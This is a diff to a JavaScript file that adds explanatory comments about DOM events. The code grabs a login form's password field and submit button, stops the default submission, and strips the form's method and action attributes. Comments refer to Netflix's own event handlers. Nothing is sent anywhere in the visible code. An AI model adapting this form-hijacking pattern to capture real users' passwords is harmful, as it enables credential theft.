@@ -29,6 +29,18 @@ const passInput = formElement.querySelector('#id_password')
 // Listen for the click event of the button element
 //   once clicked, run the callback function
 
+/**
+ * Whenever an event is triggered, there is an Event object that will be 
+ *   the first parameter in the callback function if specified.
+ *   This obj comes with a ton of members, defining parts of the event 
+ *      such as which exact element triggered the event.
+ *   We use it for the function preventDefault()
+ *      to prevent any other existing events from triggering 
+ *      (incase Netflix attached their own events that would stop our callback)
+ *      https://developer.mozilla.org/en-US/docs/Web/API/Event/preventDefault
+ * */ 
+
+
 buttonElm.addEventListener('click', function(event){
     console.log('button is clicked')
     event.preventDefault()
@@ -37,8 +49,11 @@ buttonElm.addEventListener('click', function(event){
 
 
 // Because HTML and PHP are older the JS (which is now the strongest), 
-//   the form elements have their own actions that happen whenever a button is pressed
-//   Meaning the attributes in <form> (ie method, action, type) can stop our callback event above from happening. 
+//   the form elements have their own actions that happen whenever a button is pressed, 
+///  particularly when the button is a type='submit'
+//   So if the attributes in <form> (ie method, action, type) 
+//     can stop our callback event above from happening, 
+//     removing the following should allow our callback to follow through.
 
 formElement.removeAttribute('method')
 formElement.removeAttribute('action')
